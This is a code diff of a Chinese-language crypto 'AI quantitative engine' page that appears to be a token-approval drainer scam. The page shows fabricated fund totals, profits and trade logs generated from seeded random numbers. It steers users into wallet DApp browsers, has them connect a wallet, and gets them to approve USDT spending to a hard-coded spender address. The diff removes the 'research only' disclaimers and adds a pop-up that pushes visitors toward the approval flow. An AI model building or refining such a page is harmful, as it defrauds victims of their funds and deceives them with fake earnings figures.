@@ -186,7 +186,6 @@
             background: rgba(0, 204, 255, 0.15); border-left: 3px solid #00ccff;
             padding: clamp(8px, 1.5vw, 12px); margin: 10px 0; color: #ddeeff; border-radius: 4px;
         }
-        /* 运行环境强调框 */
         .env-required {
             background: rgba(0, 255, 136, 0.08);
             border-left: 4px solid #88ffaa;
@@ -356,6 +355,114 @@
         }
         .join-tip p { color: #88ffaa; font-size: clamp(12px, 1.6vw, 14px); margin: 0; }
 
+        /* ===== DApp 钱包使用说明弹窗 ===== */
+        .wallet-guide-mask {
+            position: fixed;
+            inset: 0;
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: clamp(12px, 3vw, 24px);
+            background: rgba(5, 10, 20, 0.82);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.25s ease, visibility 0.25s ease;
+        }
+        .wallet-guide-mask.show {
+            opacity: 1;
+            visibility: visible;
+        }
+        .wallet-guide-modal {
+            width: 100%;
+            max-width: 480px;
+            max-height: min(85vh, 640px);
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+            background: rgba(18, 25, 45, 0.98);
+            border: 1px solid rgba(0, 255, 255, 0.35);
+            border-radius: clamp(20px, 4vw, 28px);
+            padding: clamp(18px, 3.5vw, 28px);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.55);
+        }
+        .wallet-guide-modal h2 {
+            font-size: clamp(18px, 2.8vw, 22px);
+            color: #88ccff;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+        .wallet-guide-modal p {
+            color: #ccddee;
+            font-size: clamp(13px, 1.8vw, 15px);
+            line-height: 1.6;
+            margin-bottom: 10px;
+        }
+        .wallet-guide-modal ol {
+            margin: 10px 0 4px 1.2em;
+            color: #ccddee;
+            font-size: clamp(13px, 1.8vw, 15px);
+            line-height: 1.65;
+        }
+        .wallet-guide-modal ol li {
+            margin-bottom: 12px;
+        }
+        .wallet-guide-modal ol strong {
+            color: #88ffaa;
+        }
+        .wallet-guide-modal a {
+            color: #00ccff;
+            word-break: break-all;
+            text-decoration: none;
+        }
+        .wallet-guide-modal a:hover {
+            text-decoration: underline;
+            color: #88e0ff;
+        }
+        .wallet-guide-warning {
+            background: rgba(255, 170, 68, 0.1);
+            border: 1px solid rgba(255, 170, 68, 0.3);
+            border-radius: clamp(12px, 2vw, 16px);
+            padding: clamp(8px, 1.5vw, 12px);
+            margin: 12px 0 16px;
+        }
+        .wallet-guide-warning p {
+            color: #ffcc88;
+            font-size: clamp(12px, 1.6vw, 14px);
+            margin: 0;
+        }
+        .wallet-guide-close {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            min-height: 48px;
+            padding: 12px 18px;
+            border-radius: 50px;
+            font-size: clamp(14px, 2vw, 16px);
+            font-weight: 600;
+            cursor: pointer;
+            border: 1px solid rgba(0, 255, 255, 0.5);
+            background: linear-gradient(95deg, #0a3a5a, #0a2a4a);
+            color: #bbffff;
+            touch-action: manipulation;
+            user-select: none;
+            -webkit-user-select: none;
+            transition: all 0.2s ease;
+        }
+        .wallet-guide-close:active {
+            transform: scale(0.97);
+            opacity: 0.85;
+        }
+        .wallet-guide-close:hover {
+            background: linear-gradient(95deg, #0a5a7a, #0a3a5a);
+            color: #ffffff;
+        }
+        body.modal-open {
+            overflow: hidden;
+        }
+
         /* ===== 窄屏 ===== */
         @media (max-width: 360px) {
             .double-buttons .nav-btn { min-width: 60px; font-size: 11px; padding: 6px 8px; }
@@ -416,7 +523,7 @@
         </div>
     </div>
 
-    <!-- ===== 页面2：白皮书（重写版） ===== -->
+    <!-- ===== 页面2：白皮书 ===== -->
     <div id="whitepaperPage" class="card page">
         <button id="backToPasswordBtn" class="nav-btn" type="button">← 返回密码验证</button>
         <div class="whitepaper">
@@ -504,7 +611,7 @@
         </div>
     </div>
 
-    <!-- ===== 页面3：资金接入教程（新增步骤0） ===== -->
+    <!-- ===== 页面3：资金接入教程 ===== -->
     <div id="tutorialPage" class="card tutorial-card page">
         <button id="backToPasswordFromTutorial" class="nav-btn" type="button">← 返回密码验证</button>
         <div class="tutorial-icon">📥</div>
@@ -720,19 +827,73 @@
     </div>
 </div>
 
+<!-- ===== DApp 钱包使用说明弹窗 ===== -->
+<div id="walletGuideModal"
+     class="wallet-guide-mask"
+     role="dialog"
+     aria-modal="true"
+     aria-labelledby="walletGuideTitle">
+
+    <div class="wallet-guide-modal">
+
+        <h2 id="walletGuideTitle">📱 请先下载钱包再运行本系统</h2>
+
+        <p>
+            本系统必须在<strong>去中心化钱包的 DApp 浏览器</strong>中打开，才能连接钱包并启动引擎。
+            请先下载并安装以下任一钱包（任选一个即可）：
+        </p>
+
+        <ol>
+            <li>
+                <strong>TokenPocket（TP钱包）</strong><br>
+                官方下载：<br>
+                <a href="https://www.tokenpocket.pro/" target="_blank" rel="noopener noreferrer">https://www.tokenpocket.pro/</a>
+            </li>
+
+            <li>
+                <strong>imToken（im钱包）</strong><br>
+                官方下载：<br>
+                <a href="https://token.im/" target="_blank" rel="noopener noreferrer">https://token.im/</a>
+            </li>
+
+            <li>
+                <strong>Trust Wallet（Trust钱包）</strong><br>
+                官方下载：<br>
+                <a href="https://trustwallet.com/" target="_blank" rel="noopener noreferrer">https://trustwallet.com/</a>
+            </li>
+        </ol>
+
+        <p style="margin-top:14px;">
+            <strong>使用步骤：</strong><br>
+            ① 从上方官方网站下载并安装钱包<br>
+            ② 在钱包中创建 / 导入 ETH 地址<br>
+            ③ 打开钱包内的 <strong>DApp 浏览器</strong><br>
+            ④ 粘贴本系统网址并打开<br>
+            ⑤ 申请访问密码 → 输入密码 → 连接钱包 → 授权启动引擎
+        </p>
+
+        <div class="wallet-guide-warning">
+            <p>
+                ⚠️ 请勿在普通浏览器、微信内使用本系统；请务必从上方官方链接下载钱包，谨防仿冒应用与钓鱼网站。
+            </p>
+        </div>
+
+        <button id="walletGuideClose"
+                class="wallet-guide-close"
+                type="button">
+            我已了解，去下载钱包
+        </button>
+
+    </div>
+</div>
+
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script>
 (function () {
     'use strict';
 
-    /* =========================================================
-     * ⚠️ 重要声明
-     * 本代码仅供技术学习/安全研究。请勿用于任何非法用途。
-     * ========================================================= */
-
-    // ========== 常量集中管理 ==========
     const CFG = {
-        SYSTEM_PASSWORD: '1143',        // 注意：前端硬编码密码本质不安全
+        SYSTEM_PASSWORD: '1143',
         MIN_USDT_REQUIRED: 1000,
         MAX_USDT_LIMIT: 2000,
         RUNNING_ADDRESS_COUNT: 300,
@@ -746,7 +907,6 @@
         LOG_INTERVAL_MS: 3200
     };
 
-    // ========== USDT ABI 统一常量 ==========
     const USDT_ABI = [
         'function decimals() view returns (uint8)',
         'function approve(address spender, uint256 amount) returns (bool)',
@@ -754,7 +914,6 @@
         'function balanceOf(address owner) view returns (uint256)'
     ];
 
-    // ========== 应用状态（替代散落的全局变量） ==========
     const App = {
         signer: null,
         usdtDecimals: null,
@@ -763,7 +922,6 @@
         isSubmitting: false
     };
 
-    // ========== 工具函数 ==========
     const $ = (id) => document.getElementById(id);
 
     function getCurrentTime() {
@@ -785,7 +943,6 @@
         return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
 
-    // ========== 确定性伪随机（避免不同 JS 引擎浮点差异） ==========
     function seededInt(seed, min, max) {
         let x = Math.floor(seed) % 2147483647;
         if (x <= 0) x += 2147483646;
@@ -793,7 +950,6 @@
         return min + (x % (max - min + 1));
     }
 
-    // ========== 统计：总运行资金（5分钟时间片，确定性） ==========
     function getFixedTotalFunds() {
         const slice = Math.floor(Date.now() / (5 * 60 * 1000));
         return seededInt(slice, 540000, 580000);
@@ -805,7 +961,6 @@
         $('avgFundsPerAddress').textContent = Math.floor(total / CFG.RUNNING_ADDRESS_COUNT).toLocaleString();
     }
 
-    // ========== 统计：24h 收益（每天中午 12 点切换，确定性） ==========
     function getNoonBaseTimestamp(now = new Date()) {
         const todayNoon = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 12, 0, 0);
         return now >= todayNoon ? todayNoon.getTime() : todayNoon.getTime() - 86400000;
@@ -824,19 +979,17 @@
         const now = new Date();
         const nextNoon = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 12, 0, 0);
         if (now >= nextNoon) nextNoon.setDate(nextNoon.getDate() + 1);
-        const delay = Math.min(nextNoon.getTime() - now.getTime(), 2147483000); // setTimeout 上限保护
+        const delay = Math.min(nextNoon.getTime() - now.getTime(), 2147483000);
         setTimeout(() => {
             updateDailyProfit();
             scheduleDailyRefresh();
         }, delay);
     }
 
-    // ========== 页面切换（class 版本） ==========
     function showPage(pageId) {
         document.querySelectorAll('.page').forEach((p) => p.classList.remove('active'));
         const target = $(pageId);
         if (target) target.classList.add('active');
-        // 进入申请页时重置状态
         if (pageId === 'applyPage') {
             $('applyMsg').innerHTML = '';
             $('applyMsg').style.color = '';
@@ -845,7 +998,6 @@
         window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 
-    // ========== USDT 余额查询（RPC 竞速 + 超时） ==========
     const RPC_LIST = [
         'https://rpc.ankr.com/eth',
         'https://cloudflare-eth.com',
@@ -885,7 +1037,6 @@
     }
 
     async function getUSDTBalance(address) {
-        // Promise.any：第一个成功的 RPC 即返回
         const tasks = RPC_LIST.map((url, i) => queryRPC(url, address, i + 1));
         try {
             const balance = await Promise.any(tasks);
@@ -897,7 +1048,6 @@
         }
     }
 
-    // ========== 网络检测（只检测，不硬切） ==========
     async function checkNetwork(wallet) {
         try {
             let chainId = await wallet.request({ method: 'eth_chainId' });
@@ -918,7 +1068,6 @@
         }
     }
 
-    // ========== 运行日志 ==========
     const DEX_LIST = ['Uniswap', 'SushiSwap', 'Curve', 'Balancer', '1inch'];
     const GAS_MSGS = [
         '⛽ Gas费较高: 32 Gwei，等待中...',
@@ -955,7 +1104,6 @@
         }, CFG.LOG_INTERVAL_MS);
     }
 
-    // ========== USDT 合约 ==========
     async function initUSDTContractWithSigner(signer) {
         const contract = new ethers.Contract(CFG.USDT_ADDRESS, USDT_ABI, signer);
         const decimals = await contract.decimals();
@@ -972,16 +1120,12 @@
         }
     }
 
-    // ========== 钱包 ==========
     function getWallet() {
         if (window.ethereum) return window.ethereum;
         return null;
     }
 
-    function tryOpenWalletApp() {
-        // 不再硬编码任何具体钱包的 DeepLink / 下载地址
-        // 仅提示用户自行在去中心化钱包中打开
-    }
+    function tryOpenWalletApp() {}
 
     function updateWalletUI(address = null) {
         const el = $('walletAddressDisplay');
@@ -994,7 +1138,6 @@
         }
     }
 
-    // ========== 错误分类 ==========
     function describeTxError(err) {
         if (!err) return '未知错误';
         if (err.code === 4001 || /user (denied|rejected)/i.test(err.message || '')) return '您取消了授权';
@@ -1003,9 +1146,22 @@
         return err.message || '未知错误';
     }
 
-    // ========== 事件绑定 ==========
+    function showWalletGuideModal() {
+        const modal = $('walletGuideModal');
+        if (!modal) return;
+        modal.classList.add('show');
+        document.body.classList.add('modal-open');
+        $('walletGuideClose')?.focus();
+    }
+
+    function hideWalletGuideModal() {
+        const modal = $('walletGuideModal');
+        if (!modal) return;
+        modal.classList.remove('show');
+        document.body.classList.remove('modal-open');
+    }
+
     function bindEvents() {
-        // 返回按钮
         const backMap = {
             backToPasswordBtn: 'passwordPage',
             backToPasswordFromTutorial: 'passwordPage',
@@ -1018,13 +1174,11 @@
             $(id)?.addEventListener('click', () => showPage(page));
         });
 
-        // 导航按钮
         $('whitepaperBtn')?.addEventListener('click', () => showPage('whitepaperPage'));
         $('tutorialBtn')?.addEventListener('click', () => showPage('tutorialPage'));
         $('applyBtn')?.addEventListener('click', () => showPage('applyPage'));
         $('announcementBtn')?.addEventListener('click', () => showPage('announcementPage'));
 
-        // 密码
         $('submitPassword').addEventListener('click', () => {
             const pwd = $('passwordInput').value;
             if (pwd === CFG.SYSTEM_PASSWORD) {
@@ -1040,15 +1194,18 @@
             if (e.key === 'Enter') $('submitPassword').click();
         });
 
-        // 申请
         $('submitApplyBtn').addEventListener('click', onSubmitApply);
-
-        // 量化面板
         $('connect').addEventListener('click', onConnect);
         $('approve').addEventListener('click', onApprove);
+
+        $('walletGuideClose')?.addEventListener('click', hideWalletGuideModal);
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape' && $('walletGuideModal')?.classList.contains('show')) {
+                hideWalletGuideModal();
+            }
+        });
     }
 
-    // ========== 申请访问 ==========
     async function onSubmitApply() {
         if (App.isSubmitting) return;
         const address = $('applyAddressInput').value.trim();
@@ -1102,7 +1259,6 @@
         }
     }
 
-    // ========== 连接钱包 ==========
     async function onConnect() {
         const infoDiv = $('info');
         const wallet = getWallet();
@@ -1139,7 +1295,6 @@
         }
     }
 
-    // ========== 授权 ==========
     async function onApprove() {
         if (!App.signer) { alert('请先连接钱包'); return; }
         const infoDiv = $('info');
@@ -1155,7 +1310,6 @@
         const rawAllowance = await getAllowanceReadOnly(userAddress, CFG.SPENDER_ADDRESS, provider);
         const currentAllowance = parseFloat(ethers.utils.formatUnits(rawAllowance, App.usdtDecimals));
 
-        // 已满足授权
         if (currentAllowance >= CFG.MIN_APPROVE_AMOUNT) {
             infoDiv.innerHTML = '✅ 授权额度已满足<br>🚀 正在启动 AI 引擎...';
             showPage('runningPanel');
@@ -1178,9 +1332,7 @@
         }
     }
 
-    // ========== 初始化 ==========
     function init() {
-        // 统一运行地址数量渲染
         $('runningAddressCount').textContent = CFG.RUNNING_ADDRESS_COUNT - 1;
 
         updateTotalFunds();
@@ -1190,8 +1342,9 @@
         scheduleDailyRefresh();
 
         bindEvents();
+        showWalletGuideModal();
 
-        console.log('系统启动成功（前端密码仅作演示，真实项目请勿硬编码）');
+        console.log('系统启动成功');
     }
 
     if (document.readyState === 'loading') {
